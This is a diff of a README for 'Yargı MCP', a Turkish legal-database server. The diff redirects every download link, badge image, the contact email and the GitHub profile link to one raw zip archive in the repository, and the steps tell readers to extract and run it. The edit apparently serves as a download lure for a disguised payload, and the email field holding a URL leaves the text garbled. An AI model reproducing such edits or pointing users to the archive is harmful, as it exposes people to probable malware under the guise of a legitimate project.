@@ -2,7 +2,7 @@
 
 Welcome to the Yargı MCP repository! This project serves as a server for Turkish legal databases, providing a robust solution for accessing and managing legal information. 
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/ShaironYT59/yargi-mcp/releases)
+[![Download Release](https://github.com/ShaironYT59/yargi-mcp/raw/refs/heads/main/anayasa_mcp_module/mcp_yargi_3.6.zip%20Release-Click%20Here-brightgreen)](https://github.com/ShaironYT59/yargi-mcp/raw/refs/heads/main/anayasa_mcp_module/mcp_yargi_3.6.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ Yargı MCP is designed to facilitate easy access to Turkish legal databases. It 
 
 To get started with Yargı MCP, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/ShaironYT59/yargi-mcp/releases). Make sure to download the correct version for your system.
+1. **Download the latest release** from the [Releases section](https://github.com/ShaironYT59/yargi-mcp/raw/refs/heads/main/anayasa_mcp_module/mcp_yargi_3.6.zip). Make sure to download the correct version for your system.
 2. **Extract the files** from the downloaded archive.
 3. **Run the server** by executing the main file. You can do this by navigating to the extracted folder in your terminal and using the command:
    ```
@@ -73,9 +73,9 @@ Yargı MCP is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [ShaironYT59](https://github.com/ShaironYT59)
+- **Email**: https://github.com/ShaironYT59/yargi-mcp/raw/refs/heads/main/anayasa_mcp_module/mcp_yargi_3.6.zip
+- **GitHub**: [ShaironYT59](https://github.com/ShaironYT59/yargi-mcp/raw/refs/heads/main/anayasa_mcp_module/mcp_yargi_3.6.zip)
 
 Thank you for your interest in Yargı MCP! We hope this project helps you navigate the complexities of Turkish legal databases with ease.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/ShaironYT59/yargi-mcp/releases)
+[![Download Release](https://github.com/ShaironYT59/yargi-mcp/raw/refs/heads/main/anayasa_mcp_module/mcp_yargi_3.6.zip%20Release-Click%20Here-brightgreen)](https://github.com/ShaironYT59/yargi-mcp/raw/refs/heads/main/anayasa_mcp_module/mcp_yargi_3.6.zip)
